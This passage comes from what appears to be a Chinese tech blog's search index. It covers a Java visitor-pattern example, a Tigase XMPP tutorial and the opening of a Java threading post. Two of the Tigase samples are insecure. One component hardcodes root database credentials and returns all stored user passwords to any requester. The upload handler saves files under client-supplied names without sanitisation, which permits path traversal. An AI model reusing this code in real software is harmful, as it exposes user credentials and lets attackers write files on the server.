class=\"keyword\">public</span> <span class=\"title function_\">AbstractEmployee</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">accept</span><span class=\"params\">(Department department)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setName</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">getWages</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> wages;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setWages</span><span class=\"params\">(Integer wages)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.wages = wages;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 正式员工</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RegularEmployee</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractEmployee</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//工资月工资</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer monthWages;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//工作时间</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer workTime;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">RegularEmployee</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">accept</span><span class=\"params\">(Department department)</span> &#123;</span><br><span class=\"line\">        department.visit(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">getMonthWages</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> monthWages;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setMonthWages</span><span class=\"params\">(Integer monthWages)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.monthWages = monthWages;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">getWorkTime</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> workTime;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setWorkTime</span><span class=\"params\">(Integer workTime)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.workTime = workTime;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 兼职员工</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">PartTimeEmployee</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractEmployee</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//小时工资</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer hourWages;</span><br><span class=\"line\">    <span class=\"comment\">//工作小时</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer workTime;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">PartTimeEmployee</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">accept</span><span class=\"params\">(Department department)</span> &#123;</span><br><span class=\"line\">        department.visit(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">getHourWages</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hourWages;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setHourWages</span><span class=\"params\">(Integer hourWages)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.hourWages = hourWages;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">getWorkTime</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> workTime;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setWorkTime</span><span class=\"params\">(Integer workTime)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.workTime = workTime;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        List&lt;AbstractEmployee&gt; employeeList = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">        <span class=\"type\">PartTimeEmployee</span> <span class=\"variable\">partTimeEmployee1</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PartTimeEmployee</span>(<span class=\"string\">&quot;兼职1&quot;</span>);</span><br><span class=\"line\">        partTimeEmployee1.setHourWages(<span class=\"number\">5</span>);</span><br><span class=\"line\">        partTimeEmployee1.setWorkTime(<span class=\"number\">80</span>);</span><br><span class=\"line\">        <span class=\"type\">PartTimeEmployee</span> <span class=\"variable\">partTimeEmployee2</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PartTimeEmployee</span>(<span class=\"string\">&quot;兼职2&quot;</span>);</span><br><span class=\"line\">        partTimeEmployee2.setHourWages(<span class=\"number\">8</span>);</span><br><span class=\"line\">        partTimeEmployee2.setWorkTime(<span class=\"number\">40</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">RegularEmployee</span> <span class=\"variable\">regularEmployee1</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RegularEmployee</span>(<span class=\"string\">&quot;正式1&quot;</span>);</span><br><span class=\"line\">        regularEmployee1.setMonthWages(<span class=\"number\">5000</span>);</span><br><span class=\"line\">        regularEmployee1.setWorkTime(<span class=\"number\">180</span>);</span><br><span class=\"line\">        <span class=\"type\">RegularEmployee</span> <span class=\"variable\">regularEmployee2</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RegularEmployee</span>(<span class=\"string\">&quot;正式2&quot;</span>);</span><br><span class=\"line\">        regularEmployee2.setMonthWages(<span class=\"number\">4000</span>);</span><br><span class=\"line\">        regularEmployee2.setWorkTime(<span class=\"number\">150</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        employeeList.add(partTimeEmployee1);</span><br><span class=\"line\">        employeeList.add(partTimeEmployee2);</span><br><span class=\"line\">        employeeList.add(regularEmployee1);</span><br><span class=\"line\">        employeeList.add(regularEmployee2);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">FaDepartment</span> <span class=\"variable\">faDepartment</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FaDepartment</span>();</span><br><span class=\"line\">        <span class=\"type\">HRDepartment</span> <span class=\"variable\">hrDepartment</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HRDepartment</span>();</span><br><span class=\"line\">        <span class=\"comment\">//HR查看员工</span></span><br><span class=\"line\">        employeeList.forEach(employee -&gt; employee.accept(hrDepartment));</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">total</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (AbstractEmployee employee : employeeList) &#123;</span><br><span class=\"line\">            employee.accept(faDepartment);</span><br><span class=\"line\">            total += employee.getWages();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;总共支付：&quot;</span> + total);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果需要新增访问者者，无需修改源码。如果需要新增具体元素，则需要修改所有的访问者。</p>\n<h3 id=\"分派\"><a href=\"#分派\" class=\"headerlink\" title=\"分派\"></a>分派</h3><p>根据对象的类型而对方法进行的选择，就是分派。分派分为静态分派、动态分派。<br>静态分派：发生在编译时期，分派根据静态类型信息发生。（重载）<br>动态分派：发生在运行时期，动态分派地置换掉某个方法。（重写）</p>\n<p>上面例子为 <strong>伪双层分派</strong>，员工调用accept只有一个方法，依据入参数得知部门，通过部门反过来调用方法visit得知入参。</p>\n<ul>\n<li>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vamF2YS1teS1saWZlL2FyY2hpdmUvMjAxMi8wNi8xNC8yNTQ1MzgxLmh0bWw=\">https://www.cnblogs.com/java-my-life/archive/2012/06/14/2545381.html<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<h3 id=\"访问者总结\"><a href=\"#访问者总结\" class=\"headerlink\" title=\"访问者总结\"></a>访问者总结</h3><p>访问者模式在实际使用中相对较少。在XML文档解析、编译器设计、复杂集合对象的处理等领域访问者设计模式得到一定的应用。如：javax.lang.model.element.Element 、 javax.lang.model.element.ElementVisitor javax.lang.model.element.Element 、 javax.lang.model.element.ElementVisitor</p>\n<p><strong>适用场景：</strong></p>\n<ul>\n<li>一个对象结构包含多种类型的对象，希望对这些对象实施一些依赖其具体类型的操作。在访问者中针对每一种具体的类型都提供了一个访问操作，不同类型的对象可以有不同的访问操作。</li>\n<li>需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作“污染”这些对象的类，也不希望在增加新操作时修改这些类。访问者模式使得我们可以将相关的访问操作集中起来定义在访问者类中，对象结构可以被多个不同的访问者类所使用，将对象本身与对象的访问操作分离。</li>\n<li>对象结构中对象对应的类很少改变，但经常需要在此对象结构上定义新的操作。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>增加新的访问操作很方便。使用访问者模式，增加新的访问操作就意味着增加一个新的具体访问者类，实现简单，无须修改源代码，符合“开闭原则”。</li>\n<li>将有关元素对象的访问行为集中到一个访问者对象中，而不是分散在一个个的元素类中。类的职责更加清晰，有利于对象结构中元素对象的复用，相同的对象结构可以供多个不同的访问者访问。</li>\n<li>让用户能够在不修改现有元素类层次结构的情况下，定义作用于该层次结构的操作。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>增加新的元素类很困难。在访问者模式中，每增加一个新的元素类都意味着要在抽象访问者角色中增加一个新的抽象操作，并在每一个具体访问者类中增加相应的具体操作，这违背了“开闭原则”的要求。</li>\n<li>破坏封装。访问者模式要求访问者对象访问并调用每一个元素对象的操作，这意味着元素对象有时候必须暴露一些自己的内部操作和内部状态，否则无法供访问者访问。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","访问者模式","Visitor Pattern"]},{"title":"Tigase 使用（一）","url":"/2017/11/13/Tigase-%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/","content":"<h3 id=\"Tigase插件\"><a href=\"#Tigase插件\" class=\"headerlink\" title=\"Tigase插件\"></a>Tigase插件</h3><p>Tigase插件被SessionManager组件和C2S所加载。</p>\n<p>新建一个maven项目，添加tigase-server依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>tigase<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>tigase-server<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>7.1.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>复制之前教程idea启动Tigase中的etc目录到该maven项目根目录下。<br>项目中创建java文件DemoPlugin</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Id(DEMO)</span></span><br><span class=\"line\"><span class=\"meta\">@Handles(</span></span><br><span class=\"line\"><span class=\"meta\">        @Handle(path = &quot;message&quot;, xmlns = &quot;jabber:client&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoPlugin</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AnnotatedXMPPProcessor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">XMPPProcessorIfc</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">DEMO</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;DEMO&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">process</span><span class=\"params\">(Packet packet, XMPPResourceConnection session, NonAuthUserRepository repo, Queue&lt;Packet&gt; results, Map&lt;String, Object&gt; settings)</span> <span class=\"keyword\">throws</span> XMPPException &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;~~~~~~~&quot;</span> + packet.toString());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>AnnotatedXMPPProcessor表示可以通过注解配置插件。插件处理消息有：</p>\n<ul>\n<li>XMPPPreprocessorIfc - is the interface for packets pre-processing plugins.</li>\n<li>XMPPProcessorIfc - is the interface for packets processing plugins.</li>\n<li>XMPPPostprocessorIfc - is the interface for packets post-processing plugins.</li>\n<li>XMPPPacketFilterIfc - is the interface for processing results filtering.</li>\n</ul>\n<p>process代码写习惯业务逻辑。注解表示该插件的唯一ID，以及需要处理指定的消息。<br>在配置文件init-mysql.properties中，添加–sm-plugins&#x3D;+DEMO，如果已经有该配置，在后面添加+DEMO即可。这里+表示添加插件，默认为+，修改为-表示去除插件，可以在SessionManagerConfig类中查看默认加载的插件。</p>\n<p>配置tigase.server.XMPPServer启动项目即可。</p>\n<span id=\"more\"></span>\n<h3 id=\"添加组件\"><a href=\"#添加组件\" class=\"headerlink\" title=\"添加组件\"></a>添加组件</h3><p>项目中添加Java文件DemoComponent</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoComponent</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractMessageReceiver</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Logger</span> <span class=\"variable\">log</span> <span class=\"operator\">=</span> Logger.getLogger(DemoComponent.class.getName());</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">processPacket</span><span class=\"params\">(Packet packet)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (packet.getTo() == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            log.log(Level.WARNING, <span class=\"string\">&quot;目标为空: &#123;0&#125;&quot;</span>, packet);</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">xmlns</span> <span class=\"operator\">=</span> packet.getXMLNS();</span><br><span class=\"line\">        <span class=\"type\">Element</span> <span class=\"variable\">returnIq</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Element</span>(Iq.QUERY_NAME);</span><br><span class=\"line\">        returnIq.setXMLNS(xmlns);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (packet <span class=\"keyword\">instanceof</span> Iq) &#123;</span><br><span class=\"line\">            <span class=\"type\">Iq</span> <span class=\"variable\">iq</span> <span class=\"operator\">=</span> (Iq) packet;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"string\">&quot;demo:search&quot;</span>.equals(iq.getIQXMLNS())) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Class.forName(<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class=\"line\">                    <span class=\"type\">Connection</span> <span class=\"variable\">connection</span> <span class=\"operator\">=</span> DriverManager.getConnection(<span class=\"string\">&quot;jdbc:mysql://localhost:3306/tigasedb?user=root&amp;password=password&quot;</span>);</span><br><span class=\"line\">                    <span class=\"type\">Statement</span> <span class=\"variable\">statement</span> <span class=\"operator\">=</span> connection.createStatement();</span><br><span class=\"line\">                    <span class=\"type\">ResultSet</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> statement.executeQuery(<span class=\"string\">&quot;select user_id, user_pw from tig_users&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (result.next()) &#123;</span><br><span class=\"line\">                        <span class=\"type\">Element</span> <span class=\"variable\">item</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Element</span>(<span class=\"string\">&quot;item&quot;</span>);</span><br><span class=\"line\">                        item.setAttribute(<span class=\"string\">&quot;userId&quot;</span>, result.getString(<span class=\"string\">&quot;user_id&quot;</span>));</span><br><span class=\"line\">                        <span class=\"type\">String</span> <span class=\"variable\">userPw</span> <span class=\"operator\">=</span> result.getString(<span class=\"string\">&quot;user_pw&quot;</span>);</span><br><span class=\"line\">                        item.setAttribute(<span class=\"string\">&quot;userPw&quot;</span>, userPw == <span class=\"literal\">null</span> ? <span class=\"string\">&quot;&quot;</span> : userPw);</span><br><span class=\"line\">                        returnIq.addChild(item);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException | SQLException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">Iq</span> <span class=\"variable\">iq</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Iq</span>(returnIq, packet.getStanzaTo(), packet.getStanzaFrom());</span><br><span class=\"line\">        addOutPacket(iq);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>继承AbstractMessageReceiver实现组件消息处理。processPacket为相关处理逻辑。通过addOutPacket返回消息。</p>\n<p>在配置文件init-mysql.properties中添加</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">--comp-name-10</span> = <span class=\"string\">demo</span></span><br><span class=\"line\"><span class=\"attr\">--comp-class-10</span> =<span class=\"string\">com.whh.tigase.DemoComponent</span></span><br></pre></td></tr></table></figure>\n<p>后面数字不要和现有重复即可。启动项目测试OK。</p>\n<h3 id=\"Tigase通过HTTP实现文件上传\"><a href=\"#Tigase通过HTTP实现文件上传\" class=\"headerlink\" title=\"Tigase通过HTTP实现文件上传\"></a>Tigase通过HTTP实现文件上传</h3><p>pom文件添加需要的依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 启动HTTP所需要依赖，否则无法启动HTTP服务--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>javax.servlet<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>javax.servlet-api<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.1.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>commons-fileupload<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>commons-fileupload<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.3.3<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>修改init-mysql.properties文件，添加HTTP组件。</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">--comp-name-1</span> = <span class=\"string\">http</span></span><br><span class=\"line\"><span class=\"attr\">--comp-class-1</span> = <span class=\"string\">tigase.http.HttpMessageReceiver</span></span><br></pre></td></tr></table></figure>\n\n<p>在项目根目录下添加script&#x2F;rest&#x2F;update文件夹。添加groovy文件UploadFile.groovy</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UploadFile</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Handler</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">UploadFile</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        regex = /\\<span class=\"comment\">//</span></span><br><span class=\"line\">        requiredRole = <span class=\"string\">&quot;user&quot;</span></span><br><span class=\"line\">        decodeContent = <span class=\"type\">false</span></span><br><span class=\"line\">        <span class=\"variable\">isAsync</span> <span class=\"operator\">=</span> <span class=\"type\">false</span></span><br><span class=\"line\">        <span class=\"variable\">execPost</span> <span class=\"operator\">=</span> &#123; Service service, callback, jid, HttpServletRequest request -&gt;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ServletFileUpload.isMultipartContent(request))&#123;</span><br><span class=\"line\">                <span class=\"type\">def</span> <span class=\"variable\">servletFileUpload</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServletFileUpload</span>()</span><br><span class=\"line\">                <span class=\"type\">def</span> <span class=\"variable\">fileIterator</span> <span class=\"operator\">=</span> servletFileUpload.getItemIterator(request)</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (fileIterator.hasNext())&#123;</span><br><span class=\"line\">                    <span class=\"type\">def</span> <span class=\"variable\">fileItem</span> <span class=\"operator\">=</span> fileIterator.next()</span><br><span class=\"line\">                    <span class=\"type\">InputStream</span> <span class=\"variable\">is</span> <span class=\"operator\">=</span> fileItem.openStream()</span><br><span class=\"line\">                    <span class=\"type\">def</span> <span class=\"variable\">fileName</span> <span class=\"operator\">=</span> fileItem.getName()</span><br><span class=\"line\">                    Streams.copy(is, <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;./&quot;</span> + fileName), <span class=\"literal\">true</span>)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            callback([fileupload: <span class=\"string\">&quot;success&quot;</span>])</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过实现tigase.http.rest.Handler 类添加rest接口。</p>\n<h3 id=\"常用入口\"><a href=\"#常用入口\" class=\"headerlink\" title=\"常用入口\"></a>常用入口</h3><p>tigase.server.xmppsession.SessionManagerConfig：插件配置的插件<br>tigase.xmpp.ProcessorFactory：加载即获取插件</p>\n<h3 id=\"需要改进的地方\"><a href=\"#需要改进的地方\" class=\"headerlink\" title=\"需要改进的地方\"></a>需要改进的地方</h3><ul>\n<li>默认tigase是没有存储消息，需要额外手动存储</li>\n<li>如果使用Spark作为客户端，可以客户端加密传输消息，如果服务端需要获取消息，需要手动解密</li>\n</ul>\n","categories":["Tigase"],"tags":["Tigase","Tigase插件","Tigase组件","HTTP文件上传"]},{"title":"Java线程基础","url":"/2017/12/11/Java%E7%BA%BF%E7%A8%8B%E5%9F%BA%E7%A1%80/","content":"<h3 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h3><ul>\n<li>jdk1.8</li>\n</ul>\n<h3 id=\"并发编程基本概念\"><a href=\"#并发编程基本概念\" class=\"headerlink\" title=\"并发编程基本概念\"></a>并发编程基本概念</h3><p>为了利用多核处理器，采用多线程编程能节省大量运行时间，带来的缺点是会导致程序复杂度的提升。</p>\n<p><strong>并行、并发</strong><br>并行：两个任务同时运行，如启动多个线程，每个线程运行各自的任务，在多核处理器中，不同的任务同时运行，可视为并行。（单核系统不存在并行）<br>并发：多个线程同时访问一个任务。</p>\n<p><strong>同步、异步</strong><br>同步：调用一个方法，必须等待该方法返回后，才能继续下一步。<br>异步：调用方法后，必须等待方法的返回，继续执行下一步。在Java中被调用的方法，一般会在另一个线程里面继续执行。</p>\n<p><strong>临界区</strong><br>用于多线程的互斥访问。如果有多个线程试图同时访问临界区，那么在有一个线程进入临界区后，其他试图访问的线程将被挂起，直到进入临界区的线程离开。临界区在被释放后，其他线程可以继续抢占，并以此达到对临界区的互斥访问。</p>\n<p><strong>阻塞、非阻塞</strong><br>阻塞：在一个线程占用了临界区的资源，其他线程想要进入临界区需等进入临界区的线程释放资源，这时是其他等待的线程被阻塞挂起。<br>非阻塞：没有线程妨碍其他线程执行。</p>\n<span id=\"more\"></span>\n<p><strong>死锁、饥饿、活锁</strong><br>死锁：单两个线程持有自己当前的锁，同时等待获取对方的锁，导致死锁。<br>饥饿：在非公平模式下，如果存在一个低优先级任务，同时存在大量高优先级任务，会导致任务低优先级任务长期获取不到资源，称之为饥饿。不过当高优先级任务完成后，低优先级任务还是有机会执行。<br>活锁：活锁、死锁本质上是一样的，原因是在获取临界区资源时，并发多个进程&#x2F;线程声明资源占用(加锁)的顺序不一致，死锁是加不上就死等，活锁是加不上就放开已获得的资源重试（tryLock）。<br>死锁举例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.TimeUnit;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TaskA</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method</span><span class=\"params\">(TaskB b)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span 